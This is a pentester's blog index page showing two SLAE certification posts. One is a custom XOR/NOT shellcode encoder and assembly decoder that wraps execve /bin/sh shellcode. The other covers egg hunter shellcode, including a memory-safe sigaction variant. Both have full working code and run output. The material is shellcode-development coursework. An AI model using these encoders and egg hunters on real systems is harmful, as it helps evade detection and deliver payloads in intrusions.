<!doctype html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
<head>
<meta charset="utf-8">
<title>Latest Posts &#8211; rtmcx</title>
<meta name="description" content="Describe this nonsense.">
<meta name="keywords" content="Jekyll, theme, themes, responsive, blog, modern">



<!-- Open Graph -->
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="Latest Posts">
<meta property="og:description" content="Describe this nonsense.">
<meta property="og:url" content="https://rtmcx.github.io/page2/">
<meta property="og:site_name" content="rtmcx">





<link rel="canonical" href="https://rtmcx.github.io/page2/">
<link href="https://rtmcx.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="rtmcx Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- For all browsers -->
<link rel="stylesheet" href="https://rtmcx.github.io/assets/css/main.css">
<!-- Webfonts -->
<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">

<meta http-equiv="cleartype" content="on">

<!-- Load Modernizr -->
<script src="https://rtmcx.github.io/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>

<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="https://rtmcx.github.io/favicon.ico">
<!-- 32x32 -->
<link rel="shortcut icon" href="https://rtmcx.github.io/favicon.png">
<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
<link rel="apple-touch-icon-precomposed" href="https://rtmcx.github.io/images/apple-touch-icon-precomposed.png">
<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://rtmcx.github.io/images/apple-touch-icon-72x72-precomposed.png">
<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://rtmcx.github.io/images/apple-touch-icon-114x114-precomposed.png">
<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://rtmcx.github.io/images/apple-touch-icon-144x144-precomposed.png">



</head>

<body id="post-index" class="feature">

<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
	<button class="dl-trigger">Open Menu</button>
	<ul class="dl-menu">
		<li><a href="https://rtmcx.github.io/">Home</a></li>
		<li>
			<a href="#">About</a>
			<ul class="dl-submenu">
				<li>
					<img src="https://rtmcx.github.io/images/CatEye.jpg" alt="rtmcx photo" class="author-photo">
					<h4>rtmcx</h4>
					<p>Pentester. OSCP. Aspiring shellcoder and malware analyst</p>
				</li>
				<li><a href="https://rtmcx.github.io/about/"><span class="btn btn-inverse">Learn More</span></a></li>
				<li>
					<a href="mailto:rtmcx@protonmail.com"><i class="fa fa-fw fa-envelope"></i> Email</a>
				</li>
				
				
				
				
				
				
				
				
				
			</ul><!-- /.dl-submenu -->
		</li>
		<li>
			<a href="#">Posts</a>
			<ul class="dl-submenu">
				<li><a href="https://rtmcx.github.io/posts/">All Posts</a></li>
				<li><a href="https://rtmcx.github.io/tags/">All Tags</a></li>
			</ul>
		</li>
		
	    
	    <li><a href="http://www.twitter.com/rtmcx" target="_blank">Twitter</a></li>
	  
	</ul><!-- /.dl-menu -->
</nav><!-- /.dl-menuwrapper -->


<div class="entry-header">
  <div class="image-credit">Image source: <a href="http://www.4a-games.com/metro-last-light.html">A4 Games</a></div><!-- /.image-credit -->
  
    <div class="entry-image">
      <img src="https://rtmcx.github.io/images/metro.jpg" alt="Latest Posts">
    </div><!-- /.entry-image -->
  
  <div class="header-title">
    <div class="header-title-wrap">
      <h1>rtmcx</h1>
      <h2>Latest Posts</h2>
    </div><!-- /.header-title-wrap -->
  </div><!-- /.header-title -->
</div><!-- /.entry-header -->

<div id="main" role="main">
  
<article class="hentry">
  <header>
    
      <div class="entry-image-index">
        <a href="https://rtmcx.github.io/SLAE-Assignment-4/" title="SLAE Assignment 4"><img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 4"></a>
      </div><!-- /.entry-image -->
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2017-04-29T00:00:00+00:00"><a href="https://rtmcx.github.io/SLAE-Assignment-4/">April 29, 2017</a></time></span><span class="author vcard"><span class="fn"><a href="https://rtmcx.github.io/about/" title="About rtmcx">rtmcx</a></span></span>
      
      <span class="entry-reading-time">
        <i class="fa fa-clock-o"></i>
        
Reading time ~4 minutes
      </span><!-- /.entry-reading-time -->
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-4/" rel="bookmark" title="SLAE Assignment 4" itemprop="url">SLAE Assignment 4</a></h1>
    
  </header>
  <div class="entry-content">
    <h1 id="requirements">Requirements</h1>

<ul>
  <li>Create a custom encoding scheme like the “Insertion Encoder” we showed you</li>
  <li>PoC with using execve­‐stack as the shellcode to encode with your schema and execute</li>
</ul>

<h2 id="custom-encoder">Custom encoder</h2>

<p>So the encoder schema i will implement is this:</p>

<p>Every other byte in the shellcode will be XOR-encoded (using different values with each byte), and every other byte will be “inverted” using the NOT-encoding.</p>

<p>A step-by-step explanation:</p>
<ol>
  <li>Start by getting the length of the shellcode. Store this value in a variable (here called counter).</li>
  <li>Take the first byte in the shellcode and XOR-encode with the value of counter. So for example, if the length of the shellcode is 25 bytes, the first XOR-value will be 0x19. Decrement counter.</li>
  <li>Go to next byte in the shellcode and NOT-encode it. Decrement counter.</li>
  <li>Take the next byte in the shellcode and XOR-encode with the value of counter. Decrement counter.</li>
  <li>Go to next byte in the shellcode and NOT-encode it. Decrement counter.</li>
  <li>Continue until the entire shellcode is decoded.</li>
</ol>

<p>Next step is to create a encoder-script:</p>

<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">struct</span>

<span class="c"># The shellcode to be encoded</span>
<span class="c"># Execve //bin/sh</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s">"</span><span class="se">\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62</span><span class="s">"</span>
             <span class="s">"</span><span class="se">\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">)</span>


<span class="c"># We will output the encoded shellcode in two formats:</span>
<span class="c"># \x00 and 0x00 for use in different situations</span>
<span class="n">encoded</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">encoded2</span> <span class="o">=</span> <span class="s">""</span>

<span class="k">print</span> <span class="s">"Encoding shellcode..."</span>
<span class="n">shellcode_length</span> <span class="o">=</span>  <span class="nb">len</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>

<span class="n">counter</span> <span class="o">=</span> <span class="n">shellcode_length</span>

<span class="c"># Loop through each byte and encode it</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
        <span class="c"># Odd or even position</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">counter</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">):</span>
                <span class="c"># Odd, NOT-encode</span>
                <span class="n">y</span> <span class="o">=</span> <span class="o">~</span><span class="n">x</span>                  
        <span class="k">else</span><span class="p">:</span>
                <span class="c"># XOR the byte with the hex value of 'counter'</span>
                <span class="n">y</span> <span class="o">=</span> <span class="n">x</span><span class="o">^</span><span class="n">counter</span>                          

        <span class="n">byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">y</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="c"># Make the byte positive</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">byte</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
                <span class="k">print</span> <span class="s">"[!] NULL byte detected in encoded shellcode, aborting!"</span>
                <span class="k">print</span> <span class="s">"[!] Please alter the input shellcode so that the encoded shellcode is NULL-free!"</span>
                <span class="k">print</span> <span class="s">"[!] The byte position is the </span><span class="si">%</span><span class="s">d:th byte"</span> <span class="o">%</span> <span class="p">(</span><span class="n">shellcode_length</span><span class="o">-</span> <span class="n">counter</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
                <span class="c">#break</span>
                <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>


        <span class="n">encoded</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\\</span><span class="s">x"</span>
        <span class="n">encoded</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%02</span><span class="s">x"</span> <span class="o">%</span> <span class="n">byte</span>

        <span class="n">encoded2</span> <span class="o">+=</span> <span class="s">"0x"</span>
        <span class="n">encoded2</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%02</span><span class="s">x,"</span> <span class="o">%</span> <span class="n">byte</span>
        <span class="n">counter</span> <span class="o">=</span> <span class="n">counter</span> <span class="o">-</span> <span class="mi">1</span>

<span class="k">print</span> <span class="n">encoded</span>
<span class="k">print</span> <span class="n">encoded2</span>

<span class="k">print</span> <span class="s">"Length: </span><span class="si">%</span><span class="s">d"</span> <span class="o">%</span> <span class="n">shellcode_length</span> <span class="c">#len(bytearray(shellcode))</span>

</code></pre>
</div>

<p>Run the encoder:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>./NOTXOR-encoder.py 
Encoding shellcode...
<span class="se">\x</span>ce<span class="se">\x</span>d8<span class="se">\x</span>af<span class="se">\x</span>73e<span class="se">\x</span>91<span class="se">\x</span>3b<span class="se">\x</span>8c<span class="se">\x</span>7a<span class="se">\x</span>97<span class="se">\x</span>3f<span class="se">\x</span>d0<span class="se">\x</span>6c<span class="se">\x</span>96<span class="se">\x</span>85<span class="se">\x</span>1c<span class="se">\x</span>5a<span class="se">\x</span>76<span class="se">\x</span>ea<span class="se">\x</span>ac<span class="se">\x</span>8f<span class="se">\x</span>1e<span class="se">\x</span>b4<span class="se">\x</span>f4<span class="se">\x</span>cf<span class="se">\x</span>7f
0xce,0xd8,0xaf,0x7e,0x91,0x3b,0x8c,0x7a,0x97,0x3f,0xd0,0x6c,0x96,0x85,0x1c,0x5a,0x76,0xea,0xac,0x8f,0x1e,0xb4,0xf4,0xcf,0x7f,
Length: 25
rtmcx@parrot <span class="nv">$ </span>
</code></pre>
</div>

<p>So the the shellcode went from this:<br />
\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</p>

<p>to this:<br />
\xce\xd8\xaf\x73e\x91\x3b\x8c\x7a\x97\x3f\xd0\x6c\x96\x85\x1c\x5a\x76\xea\xac\x8f\x1e\xb4\xf4\xcf\x7f</p>

<h2 id="decoder">Decoder</h2>

<p>Next step is to write the decoder in asm.</p>

<p>The steps to be performed are:</p>
<ol>
  <li>Put the shellcode in esi, by using the “Jump-Call-Pop”-method.</li>
  <li>Put the length of the shellcode in ecx (for the counter)</li>
  <li>Loop over every byte and decode the byte in the appropriate way.</li>
  <li>When we have decoded the entire shellcode, pass execution to the decoded shellcode.</li>
</ol>

<h4 id="to-xor-or-not-to-xor">To XOR or NOT to XOR</h4>
<p>So the big question here is, how do we determine which operation to use, AND or XOR? 
In the decoder, the modulos-operator was used and we need to implement that in the decoder also.</p>

<p>As in the encoder, the first value to use in XOR-decoding is the value of the length of the shellcode (here 25, or 0x19).</p>

<p>Put this value in edx and AND the value with 1. 
If the value is even, the result will be 0, and the ZERO-flag will be set. 
If the value is odd, the ZERO-flag will not be set.</p>

<p><b>Small examples</b></p>

<table style="width: 200px; border:1px solid;">
<tr>
        <th colspan="2">Even value</th>
</tr>

<tr>
        <td>Value</td>
        <td>0110</td>
</tr>
<tr>
        <td>AND</td>
        <td>0001</td>
</tr>
<tr>
        <td>Result</td>
        <td>0000</td>
</tr>
</table>
<p>Result is 0, and the ZERO-flag will be set.</p>

<table style="width: 300px; border:1px solid;">
<tr>
        <th colspan="2">Odd value</th>
</tr>
<tr>
        <td>Value</td>
        <td>0101</td>
</tr>
<tr>
        <td>AND</td>
        <td>0001</td>
</tr>
<tr>
        <td>Result</td>
        <td>0001</td>
</tr>
</table>
<p>Result is 1, and the ZERO-flag will be not be set.</p>

<p>Then it’s just a matter of checking if the result is 1 or 0 and jump to the operation for the byte.</p>

<p>Here is the full, commented, code</p>
<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="kr">global</span> <span class="n">_start</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
<span class="n">_start</span><span class="o">:</span>
        <span class="c">; Put shellcode on stack by "jump-call-pop"</span>
        <span class="k">jmp</span> <span class="n">short</span> <span class="n">push_shellcode</span>

<span class="n">decoder</span><span class="o">:</span>
        <span class="k">pop</span> <span class="n">esi</span>                 <span class="c">; Put shellcode-address in esi</span>

        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>            <span class="c">; zero out ecx</span>
        <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="n">sc_length</span>       <span class="c">; length of shellcode, used as counter</span>
<span class="n">decode</span><span class="o">:</span>
        <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">ecx</span>            <span class="c">; put the value of counter in edx</span>
        <span class="k">and</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">1</span>              <span class="c">; (Byte position) modulo 2</span>

        <span class="k">cmp</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">1</span>              <span class="c">; is it odd?</span>
        <span class="k">je</span> <span class="n">not_decode</span>           <span class="c">; No, even, so this is a "Not"</span>

        <span class="k">xor</span> <span class="n">byte</span> <span class="p">[esi],</span> <span class="n">cl</span>      <span class="c">; Odd, "XOR"</span>
        <span class="k">jmp</span> <span class="n">next_byte</span>           <span class="c">; Step over the "not"-decode for this byte</span>

<span class="n">not_decode</span><span class="o">:</span>
        <span class="k">not</span> <span class="n">byte</span> <span class="p">[esi]</span>          <span class="c">; 'NOT'-decode</span>

<span class="n">next_byte</span><span class="o">:</span>
        <span class="k">inc</span> <span class="n">esi</span>                 <span class="c">; next byte</span>
        <span class="k">loop</span> <span class="n">decode</span>             <span class="c">; loop until all bytes in array</span>

        <span class="k">jmp</span> <span class="n">short</span> <span class="n">shellcode</span>     <span class="c">; All decoded, Jump to decoded shellcode and exec...</span>

<span class="n">push_shellcode</span><span class="o">:</span>
        <span class="k">call</span> <span class="n">decoder</span>
        <span class="n">shellcode</span><span class="o">:</span> <span class="kt">db</span> <span class="mh">0xce</span><span class="p">,</span><span class="mh">0xd8</span><span class="p">,</span><span class="mh">0xaf</span><span class="p">,</span><span class="mh">0x7e</span><span class="p">,</span><span class="mh">0x91</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mh">0x8c</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x3f</span><span class="p">,</span><span class="mh">0xd0</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span>
        <span class="mh">0x96</span><span class="p">,</span><span class="mh">0x85</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0xea</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span><span class="mh">0x8f</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="mh">0xb4</span><span class="p">,</span><span class="mh">0xf4</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0x7f</span>
        <span class="n">sc_length</span> <span class="k">equ</span> <span class="err">$</span><span class="o">-</span><span class="n">shellcode</span>
</code></pre>
</div>

<p>Compile and execute the decoder</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>./compile.sh notxor
<span class="o">[</span><span class="k">***</span><span class="o">]</span> Compiling with nasm...
<span class="o">[</span><span class="k">***</span><span class="o">]</span> Linking with ld...

<span class="o">[</span><span class="k">***</span><span class="o">]</span> Extracted shellcode:
<span class="se">\x</span>eb<span class="se">\x</span>1a<span class="se">\x</span>5e<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>b1<span class="se">\x</span>19<span class="se">\x</span>89<span class="se">\x</span>ca<span class="se">\x</span>83<span class="se">\x</span>e2<span class="se">\x</span>01<span class="se">\x</span>83<span class="se">\x</span>fa<span class="se">\x</span>01<span class="se">\x</span>74<span class="se">\x</span>04<span class="se">\x</span>30<span class="se">\x</span>0e<span class="se">\x</span>eb<span class="se">\x</span>02<span class="se">\x</span>f6<span class="se">\x</span>16<span class="se">\x</span>46<span class="se">\x</span>e2<span class="se">\x</span>ed<span class="se">\x</span>eb<span class="se">\x</span>05<span class="se">\x</span>e8<span class="se">\x</span>e1<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ce<span class="se">\x</span>d8<span class="se">\x</span>af<span class="se">\x</span>7e<span class="se">\x</span>91<span class="se">\x</span>3b<span class="se">\x</span>8c<span class="se">\x</span>7a<span class="se">\x</span>97<span class="se">\x</span>3f<span class="se">\x</span>d0<span class="se">\x</span>6c<span class="se">\x</span>96<span class="se">\x</span>85<span class="se">\x</span>1c<span class="se">\x</span>5a<span class="se">\x</span>76<span class="se">\x</span>ea<span class="se">\x</span>ac<span class="se">\x</span>8f<span class="se">\x</span>1e<span class="se">\x</span>b4<span class="se">\x</span>f4<span class="se">\x</span>cf<span class="se">\x</span>7f

<span class="o">[</span><span class="k">***</span> DONE <span class="k">***</span><span class="o">]</span>

rtmcx@parrot <span class="nv">$ </span>./shellcode-notxor 
Shellcode length: 58
<span class="gp">$ </span>
</code></pre>
</div>

<p>Success! The encoded shellcode is decoded and execution passed to the decoded shellcode.</p>

<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>

<hr />

<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>

<p>Student ID: PA-0726</p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
      <div class="entry-image-index">
        <a href="https://rtmcx.github.io/SLAE-Assignment-3/" title="SLAE Assignment 3"><img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 3"></a>
      </div><!-- /.entry-image -->
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2017-04-23T00:00:00+00:00"><a href="https://rtmcx.github.io/SLAE-Assignment-3/">April 23, 2017</a></time></span><span class="author vcard"><span class="fn"><a href="https://rtmcx.github.io/about/" title="About rtmcx">rtmcx</a></span></span>
      
      <span class="entry-reading-time">
        <i class="fa fa-clock-o"></i>
        
Reading time ~4 minutes
      </span><!-- /.entry-reading-time -->
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-3/" rel="bookmark" title="SLAE Assignment 3" itemprop="url">SLAE Assignment 3</a></h1>
    
  </header>
  <div class="entry-content">
    <h1 id="requirements">Requirements</h1>

<ul>
  <li>Study about the Egg Hunter shellcode</li>
  <li>Create a working demo of the Egghunter</li>
  <li>Should be configurable for different payloads</li>
</ul>

<h2 id="what-is-a-egg-hunter">What is a egg hunter?</h2>

<p>Lets say that you can controll a small space in memory, but it is to small to hold the payload shellcode. At the same time, you can control more space somewhere else in memory, but you don know where in memory this larger space is.
The idea behind the egg hunter is to inject a piece of code that searches (or hunts) the entire memory of the process for a known byte sequence, called the “egg”. Of course, we would have to add the “egg” to the beginning of the payload so the egg hunter can find it.</p>

<p>When the egg is found, the execution is redirected to the place right after the egg, which contain the full payload.</p>

<p>To avoid that the egg hunter finds “itself” (since the egg it’s searching for is also present in the egg hunter code), we set up the egg to appear twice in the beginning of the payload.</p>

<p>So if the egg is “0xDEADBEFF”, the payload would start with “0xDEADBEFFDEADBEFF”.</p>

<p>So the egg hunter needs to perform the following steps:</p>
<ol>
  <li>set up a starting point in memory, to start search from.</li>
  <li>Check if the current memory address contains the “egg”.</li>
  <li>If not, go to the next memory address.</li>
  <li>If the egg is found, check if the egg is present twice to avoid the hunter to find itself (philosophical stuff!).</li>
  <li>If the egg is found twice in a row, redirect execution to that memory location (or just after the egg) and start executing the payload.</li>
</ol>

<p>So when the egg hunter is executed, it will start searching through the memory looking for the egg.</p>

<h2 id="small-egg-hunter">Small egg hunter</h2>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="kr">global</span> <span class="n">_start</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
<span class="n">_start</span><span class="o">:</span>
        <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">esp</span>            <span class="c">; The address to start the memory search from</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span>  <span class="mh">0x50905090</span>    <span class="c">; This is the egg (little endian)</span>

<span class="n">hunting</span><span class="o">:</span>
        <span class="k">inc</span> <span class="n">eax</span>                 <span class="c">; Go to next byte in memory</span>
        <span class="k">cmp</span> <span class="n">dword</span> <span class="p">[eax],</span> <span class="n">ebx</span>    <span class="c">; Compare the value in the memory address to the egg</span>
        <span class="k">jne</span> <span class="n">hunting</span>             <span class="c">; No egg, loop (to got to next address)</span>

        <span class="c">; second search, since the egg must be two times in row</span>
        <span class="k">cmp</span> <span class="n">dword</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">ebx</span> <span class="c">; Compare the value in the memory address to the egg </span>
        <span class="k">jne</span> <span class="n">hunting</span>             <span class="c">; No egg, loop</span>

        <span class="c">; EGG found, execute payload located after egg</span>
        <span class="k">jmp</span> <span class="n">eax</span>

</code></pre>
</div>

<h2 id="egg-hunter-test-program">Egg hunter test program</h2>

<p>To test the egg hunter, we create a small program that adds a shellcode somewhere in memory and our egg hunter that will search for the egg in the shellcode. The shellcode just prints “Hello World!”, but it is enough for the demo purpose here.</p>

<div class="language-c highlighter-rouge"><pre class="highlight"><code>
<span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="cp">#define EGG "\x90\x50\x90\x50"
</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">egg</span><span class="p">[]</span> <span class="o">=</span> <span class="n">EGG</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">egghunter</span> <span class="o">=</span> \
<span class="s">"</span><span class="se">\x89\xe0\xbb\x90\x50\x90\x50\x40\x39\x18\x75\xfb\x39\x58\x04\x75\xf6\xff\xe0</span><span class="s">"</span><span class="p">;</span>

<span class="c1">// The shellcode just prints "Hello World!"
</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">shellcode</span> <span class="o">=</span> \
<span class="s">"</span><span class="se">\xeb\x17\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\x04\x01</span><span class="s">"</span><span class="p">;</span>
<span class="s">"</span><span class="se">\x89\xc3\xcd\x80\xe8\xe4\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
        <span class="kt">char</span> <span class="n">code</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>

        <span class="n">strcpy</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">egg</span><span class="p">);</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="n">code</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="n">egg</span><span class="p">);</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="n">code</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"Egghunter length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">egghunter</span><span class="p">));</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Stack location  %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">code</span><span class="p">);</span>
        <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">egghunter</span><span class="p">;</span>
        <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</code></pre>
</div>
<p>Compile and execute the program:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>gcc -m32 -fno-stack-protector -z  execstack shellcode-hunter.c -o shellcode-hunter
rtmcx@parrot <span class="nv">$ </span>./shellcode-hunter 
Egghunter length: 19
Stack location  0xbf8856e4
Hello World!
rtmcx@parrot <span class="nv">$ </span>
</code></pre>
</div>
<p>Great, it works! The egg is found, and the shellcode is executed.</p>

<h2 id="mem-safe-egg">Mem safe EGG</h2>

<p>The problem with the previous version of the egg hunter arises when/if the hunter tries to search a memory segments that we do not have access to.</p>

<p>The answer to this problem can be found in the excellent paper 
<a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Safely Searching Process Virtual Address Space</a> by Skape.</p>

<p>The paper describes several techniques to search through the memory space in a safe maner. 
I selected the “sigaction”-method, as this is the fastest and smallest of the techniques described.</p>

<p>I will not describe the code, as the paper does that in great detail, but I have commented the code so it should be fairly easy to figure out and follow what it does.</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="kr">global</span> <span class="n">_start</span>

<span class="n">EGG</span> <span class="k">equ</span> <span class="mh">0x50905090</span>      <span class="c">; EGG in little endian</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
<span class="n">_start</span><span class="o">:</span>

<span class="n">page_align</span><span class="o">:</span>
        <span class="c">; Set up page size (which is 4096) </span>
        <span class="k">or</span> <span class="n">cx</span><span class="p">,</span> <span class="mh">0xfff</span>    <span class="c">; Page alignment. Set cx to contain 4095</span>

<span class="n">hunting</span><span class="o">:</span>
        <span class="k">inc</span> <span class="n">ecx</span>         <span class="c">; Go to next address </span>

        <span class="c">; Setup syscall "sigaction"</span>
        <span class="k">push</span> <span class="n">byte</span> <span class="mh">0x43</span>  <span class="c">; sigaction (syscall number 67, 0x43)</span>
        <span class="k">pop</span> <span class="n">eax</span>         <span class="c">; syscall number to eax</span>
        <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>

        <span class="c">; compare the result</span>
        <span class="k">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xf2</span>    <span class="c">; Is the result EFAULT?  </span>
        <span class="k">jz</span> <span class="n">page_align</span>   <span class="c">; Yes, invalid address, try next address page</span>

        <span class="c">; We have access to the page and can start to search the egg..  </span>

        <span class="c">; Set EGG in eax and current address content in edi</span>
        <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">EGG</span> 	<span class="c">; Place EGG in eax</span>
        <span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Address content to compare</span>

        <span class="k">scasd</span>           <span class="c">; compare the dwords in eax/edi (scasd also increments edi by 4)</span>
        <span class="k">jnz</span> <span class="n">hunting</span>     <span class="c">; They did not match, try next address</span>

        <span class="c">; The EGG should be twice in a row</span>
        <span class="c">; so compare next 4 bytes</span>
        <span class="k">scasd</span>           <span class="c">; compare the next 4 bytes</span>
        <span class="k">jnz</span> <span class="n">hunting</span>     <span class="c">; They did not match, try next address</span>

        <span class="c">; EGG Found</span>
        <span class="k">jmp</span> <span class="n">edi</span>         <span class="c">; jump to address of the EGG</span>

</code></pre>
</div>

<p>This version is memsafe and can be used even if ASLR is enabled (which is not the case with the first version).</p>

<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>

<hr />

<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>

<p>Student ID: PA-0726</p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
      <div class="entry-image-index">
        <a href="https://rtmcx.github.io/SLAE-Assignment-2/" title="SLAE Assignment 2"><img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 2"></a>
      </div><!-- /.entry-image -->
    
    <div class="entry-meta">
